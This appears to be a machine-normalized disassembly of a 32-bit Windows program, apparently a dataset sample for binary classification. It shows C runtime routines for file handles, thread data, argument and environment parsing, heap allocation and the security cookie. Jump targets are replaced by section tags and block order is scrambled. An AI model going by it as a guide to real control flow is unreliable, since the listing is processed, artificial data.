inc [ ebp - 0x1abc ]
mov esi [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1abc ]
add esi ecx
mov eax [ ebp - 0x1ac4 ]
cmp [ ebp - 0x1ac8 ] eax
jl r-xdata
xor ecx ecx
inc eax
inc [ ebp - 0x1ac0 ]
push ecx
push ecx
push 0x5
mov [ ebp - 0x1ad4 ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x1acc ]
push eax
push ecx
push [ ebp - 0x1af0 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x1ac4 ] eax
test eax eax
je r-xdata
test esi esi
jne r-xdata
cmp [ ebp - 0x1ae8 ] edi
je r-xdata
mov ecx [ ebp - 0x1acc ]
jmp r-xdata
mov ecx [ ebp - 0x1adc ]
lea eax [ ebp - 0x1ac8 ]
push 0x0
push eax
push 0x1
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] 0xd
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x1
jl r-xdata
inc [ ebp - 0x1abc ]
inc esi
sub_405f18
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_405f5e
pop ecx
test eax eax
je r-xdata
push esi
call sub_405fcc
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_404f52
push eax
call sub_40976b
neg eax
pop ecx
pop ecx
sbb eax eax
jmp r-xdata
sub_405f5e
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0xc ]
and al 0x3
cmp al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax ebx
and [ esi + 0x4 ] 0x0
mov [ esi ] ecx
pop esi
pop ebx
pop ebp
retn
test [ esi + 0xc ] 0x108
je r-xdata
push edi
mov edi [ esi ]
sub edi [ esi + 0x8 ]
test edi edi
jle r-xdata
pop edi
push edi
push [ esi + 0x8 ]
push esi
call sub_404f52
pop ecx
push eax
call sub_4055c4
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_405fcc
push 0x14
push r--data
call sub_4021d0
xor edi edi
mov [ ebp - 0x1c ] edi
and [ ebp - 0x24 ] edi
push 0x1
call sub_402c45
pop ecx
and [ ebp - 0x4 ] edi
xor esi esi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4060a7
cmp ebx 0x1
mov eax edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
call sub_402215
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_4040f7
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_406074
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push eax
call sub_405f18
pop ecx
cmp eax 0xffffffff
je r-xdata
test [ eax + 0xc ] 0x2
je r-xdata
inc edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
call sub_405f18
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_4060b0
push 0x10
push r--data
call sub_4021d0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_4028a5
mov [ eax ] ebx
call sub_4028d9
mov [ eax ] 0x9
jmp r-xdata
call sub_4028a5
mov [ eax ] ebx
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
jne r-xdata
push esi
call sub_409550
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_4028a5
and [ eax ] 0x0
jmp r-xdata
call sub_4028d9
mov [ eax ] 0x9
or edi 0xffffffff
push esi
call sub_40618b
pop ecx
mov edi eax
jmp r-xdata
call sub_4028d9
mov [ eax ] 0x9
call sub_402521
call sub_402215
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406163
mov eax edi
jmp r-xdata
sub_40618b
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_409664
pop ecx
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor eax eax
push esi
call sub_4028b8
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push edi
call sub_409664
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_409664
push 0x1
mov esi eax
call sub_409664
pop ecx
pop ecx
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push edi
call sub_4095de
pop ecx
mov ecx edi
and edi 0x1f
sar ecx 0x5
shl edi 0x6
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edi + 0x4 ] 0x0
test esi esi
je r-xdata
sub_406225
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x83
je r-xdata
pop esi
pop ebp
retn
test [ esi + 0xc ] 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_402bcd
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_406255
push 0x8
push r--data
call sub_4021d0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_402215
retn 0x4
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x2c ] 0x0
je r-xdata
push [ esi + 0x24 ]
call sub_402bcd
pop ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x2c ]
call sub_402bcd
pop ecx
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0x34 ]
call sub_402bcd
pop ecx
cmp [ esi + 0x40 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call sub_402bcd
pop ecx
cmp [ esi + 0x44 ] 0x0
je r-xdata
push [ esi + 0x40 ]
call sub_402bcd
pop ecx
cmp [ esi + 0x48 ] 0x0
je r-xdata
push [ esi + 0x44 ]
call sub_402bcd
pop ecx
cmp [ esi + 0x5c ] r--data
je r-xdata
push [ esi + 0x48 ]
call sub_402bcd
pop ecx
push 0xd
call sub_402c45
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
push [ esi + 0x5c ]
call sub_402bcd
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406375
push 0xc
call sub_402c45
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406381
push esi
call sub_402bcd
pop ecx
push edi
call sub_40814f
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp ecx rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push ecx
call sub_402bcd
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_407ff5
pop ecx
sub_4063a2
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_402e01
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x3bc
push 0x1
call sub_4020e9
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
call sub_402e20
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_402bcd
pop ecx
xor esi esi
push 0x0
push esi
call sub_406411
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_406411
push 0x8
push r--data
call sub_4021d0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
push 0x43
pop eax
mov [ esi + 0xb8 ] ax
mov [ esi + 0x1be ] ax
mov [ esi + 0x68 ] rw-data
and [ esi + 0x3b8 ] 0x0
push 0xd
call sub_402c45
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x68 ]
mov ecx edi
[ eax ] ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4064b2
push 0xc
call sub_402c45
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_407f60
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4064bb
call sub_402215
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_4064c4
call sub_401a73
call sub_402d76
test eax eax
jne r-xdata
push sub_406255
call sub_402dc4
mov [ rw-data ] eax
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_40653a
xor eax eax
retn
push esi
push 0x3bc
push 0x1
call sub_4020e9
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_40653a
xor eax eax
pop esi
retn
push esi
push [ rw-data ]
call sub_402e20
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push esi
call sub_406411
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
pop esi
retn
sub_406557
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_403558
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
je r-xdata
sub_4065a6
push ebp
mov ebp esp
push esi
call sub_4063a2
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ esi + 0x5c ]
mov ecx edx
push edi
mov edi [ ebp + 0x8 ]
lea eax [ edx + 0x90 ]
cmp ecx eax
jae r-xdata
add ecx 0xc
lea eax [ edx + 0x90 ]
cmp ecx eax
jb r-xdata
xor ecx ecx
cmp [ ecx ] edi
je r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
test ecx ecx
je r-xdata
cmp edx 0x5
jne r-xdata
cmp edx 0x1
jne r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
push [ ecx + 0x4 ]
and [ ecx + 0x8 ] 0x0
call edx
push 0x24
pop edi
mov eax [ esi + 0x5c ]
and [ edi + eax + 0x8 ] 0x0
add edi 0xc
cmp edi 0x90
jl r-xdata
cmp [ ecx ] 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp [ ecx ] 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
or eax 0xffffffff
pop ebx
jmp r-xdata
cmp [ ecx ] 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp [ ecx ] 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_406716
push 0x64
push r--data
call sub_4021d0
push 0xb
call sub_402c45
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x40
push 0x20
pop edi
push edi
call sub_4020e9
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_404e00
add esp 0xc
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x42 ] 0x0
je r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov al [ ecx + 0x24 ]
and al 0x7f
mov [ ecx + 0x24 ] al
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
mov eax [ rw-data ]
jmp r-xdata
call sub_402215
retn
push 0xfffffffe
pop ebx
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] ebx
call sub_4069c1
xor eax eax
mov esi edi
shl esi 0x6
add esi [ rw-data ]
mov [ ebp - 0x24 ] esi
cmp [ esi ] 0xffffffff
je r-xdata
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
add eax 0x4
mov [ ebp - 0x28 ] eax
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax 0x800
cmp ecx eax
jl r-xdata
mov [ esi + 0x4 ] 0x81
test edi edi
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor esi esi
inc esi
mov [ ebp - 0x30 ] esi
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ edi - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x80
mov [ esi + 0x4 ] al
jmp r-xdata
mov edi ebx
mov [ ebp - 0x2c ] edi
push 0xfffffffe
pop ebx
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x20 ]
push 0x40
push edi
call sub_4020e9
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
mov [ esi + 0x4 ] al
mov [ esi ] ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
je r-xdata
inc edi
jmp r-xdata
xor edi edi
mov esi [ edx ]
cmp esi 0xffffffff
je r-xdata
mov [ esi * 4 + rw-data ] ecx
add [ rw-data ] edi
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov eax [ eax + edi * 4 ]
mov [ eax + 0x10 ] ebx
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x2c ] edi
cmp edi 0x3
jge r-xdata
inc edi
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
add edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp esi ebx
je r-xdata
inc esi
mov [ ebp - 0x30 ] esi
mov ecx [ ebp - 0x1c ]
jmp r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov [ esi ] ecx
and eax 0xff
cmp eax 0x2
jne r-xdata
cmp edi ecx
jge r-xdata
mov al [ eax ]
test al 0x1
je r-xdata
cmp [ rw-data ] ecx
jge r-xdata
mov eax [ esi * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
cmp eax 0x3
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
jmp r-xdata
test al 0x8
jne r-xdata
push 0x0
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_402e65
add esp 0xc
inc [ esi + 0x8 ]
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x8
mov [ esi + 0x4 ] al
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x24 ] esi
mov eax [ edx ]
mov [ esi ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0x0
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_402e65
add esp 0xc
inc [ esi + 0x8 ]
mov edx [ ebp - 0x20 ]
push esi
call [ GetFileType@IAT ]
mov edx [ ebp - 0x20 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub_4069ca
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x104
mov ebx rw-data
xor eax eax
push ebx
xor edi edi
mov [ rw-data ] ax
push edi
call [ GetModuleFileNameW@IAT ]
mov esi [ rw-data ]
mov [ rw-data ] ebx
test esi esi
je r-xdata
mov esi ebx
cmp [ esi ] di
jne r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x8 ]
cmp eax 0x7fffffff
jae r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push esi
call sub_406a78
mov ebx [ ebp - 0x4 ]
add esp 0x14
cmp ebx 0x3fffffff
jae r-xdata
lea ecx [ eax + ebx * 2 ]
add eax eax
add ecx ecx
cmp ecx eax
jb r-xdata
push ecx
call sub_402131
mov edi eax
pop ecx
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + ebx * 4 ]
push eax
push edi
push esi
call sub_406a78
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] edi
mov [ rw-data ] eax
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_406a78
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebx ] edi
mov [ eax ] 0x1
test esi esi
je r-xdata
mov [ ebp + 0x8 ] 0x20
mov [ ebp - 0x4 ] 0x9
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
inc [ ebx ]
test edx edx
je r-xdata
xor eax eax
test edi edi
push 0x22
sete al
add ecx 0x2
mov edi eax
pop eax
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
test ax ax
je r-xdata
mov ax [ ecx ]
mov [ edx ] ax
add edx 0x2
test edi edi
jne r-xdata
sub ecx 0x2
push 0x22
pop eax
cmp [ ecx ] ax
jne r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
test esi esi
je r-xdata
movzx eax [ ecx ]
cmp ax [ ebp + 0x8 ]
je r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
mov esp ebp
pop ebp
retn
mov [ esi ] ebx
add ecx 0x2
jmp r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov edi [ ebp + 0x18 ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
xor eax eax
mov [ edx - 0x2 ] ax
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0x8 ]
inc [ eax ]
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
cmp [ ecx ] ax
je r-xdata
add ecx 0x2
inc ebx
push 0x22
pop eax
cmp [ ecx ] ax
push 0x5c
pop eax
jne r-xdata
test ebx ebx
jne r-xdata
test bl 0x1
jne r-xdata
dec ebx
test edx edx
je r-xdata
movzx eax [ ecx ]
test ax ax
je r-xdata
shr ebx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
test edx edx
je r-xdata
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
xor eax eax
test esi esi
sete al
mov esi eax
push 0x22
pop edi
cmp [ ecx + 0x2 ] di
mov edi [ ebp + 0x18 ]
jne r-xdata
inc [ edi ]
xor ebx ebx
jmp r-xdata
xor eax eax
mov [ edx ] ax
add edx 0x2
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
add ecx 0x2
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
add ecx 0x2
xor ebx ebx
jmp r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
je r-xdata
push 0x5c
pop eax
push 0x5c
mov [ ebp - 0x8 ] 0x1
pop eax
jmp r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
sub_406c07
push ebx
push esi
mov esi [ rw-data ]
xor ebx ebx
push edi
mov edi ebx
test esi esi
jne r-xdata
movzx eax [ esi ]
push 0x3d
pop ecx
test ax ax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax cx
je r-xdata
lea eax [ edi + 0x1 ]
push 0x4
push eax
call sub_4020e9
mov edi eax
mov [ rw-data ] edi
pop ecx
pop ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call sub_4088e5
pop ecx
lea esi [ esi + eax * 2 ]
add esi 0x2
inc edi
mov esi [ rw-data ]
cmp [ esi ] bx
je r-xdata
push esi
call sub_402bcd
mov [ rw-data ] ebx
xor eax eax
mov [ edi ] ebx
mov [ rw-data ] 0x1
push esi
call sub_4088e5
pop ecx
push 0x3d
lea ebx [ eax + 0x1 ]
pop eax
cmp [ esi ] ax
je r-xdata
lea esi [ esi + ebx * 2 ]
xor ebx ebx
cmp [ esi ] bx
jne r-xdata
push 0x2
push ebx
call sub_4020e9
mov [ edi ] eax
pop ecx
pop ecx
test eax eax
je r-xdata
mov esi [ rw-data ]
push [ rw-data ]
call sub_402bcd
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_408889
add esp 0xc
test eax eax
jne r-xdata
pop ecx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_402531
int3
add edi 0x4
sub_406cf6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
js r-xdata
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
or eax 0xffffffff
pop ebp
retn
cmp eax 0x2
jle r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] eax
cmp eax 0x3
jne r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov eax ecx
pop ebp
retn
sub_406d36
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
mov eax [ rw-data ]
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x14 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_406dd2
push ebp
mov ebp esp
push ecx
push edi
call [ GetEnvironmentStringsW@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
xor ebx ebx
push esi
mov esi edi
cmp [ edi ] bx
je r-xdata
sub esi edi
add esi 0x2
push esi
call sub_402131
mov [ ebp - 0x4 ] eax
pop ecx
test eax eax
je r-xdata
add esi 0x2
cmp [ esi ] bx
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
pop esi
mov eax ebx
pop ebx
push esi
push edi
push eax
call sub_404f80
mov ebx [ ebp - 0x4 ]
add esp 0xc
add esi 0x2
cmp [ esi ] bx
jne r-xdata
sub_406e2f
mov ecx [ rw-data ]
xor edx edx
test ecx ecx
jne r-xdata
push esi
push 0x20
pop esi
mov ecx r--data
cmp eax 0x22
jne r-xdata
test ax ax
je r-xdata
add ecx 0x2
jmp r-xdata
xor eax eax
test edx edx
sete al
mov edx eax
mov eax ecx
pop esi
retn
test edx edx
je r-xdata
movzx eax [ ecx ]
cmp ax si
ja r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
cmp ax si
ja r-xdata
add ecx 0x2
sub_406e84
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40292d
pop ecx
pop ebp
retn
push ebx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_402bcd
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_402aec
pop ecx
call sub_4028d9
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
inc esi
mov eax ebx
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop ebx
call sub_4028d9
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4028ec
pop ecx
mov [ esi ] eax
push esi
call sub_402aec
pop ecx
test eax eax
je r-xdata
call sub_4028d9
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4028ec
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_406f2f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jae r-xdata
xor ecx ecx
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_4028d9
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push esi
call sub_402aec
pop ecx
test eax eax
jne r-xdata
mov eax ecx
mov [ eax ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov [ eax ] 0xc
sub_406fb0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
movzx eax [ esp + 0x8 ]
bt [ rw-data ] 0x1
jae r-xdata
mov edx [ esp + 0xc ]
cmp edx 0x80
jl r-xdata
mov ecx [ esp + 0xc ]
push edi
mov edi [ esp + 0x8 ]
[ edi ]
jmp r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
test eax eax
jne r-xdata
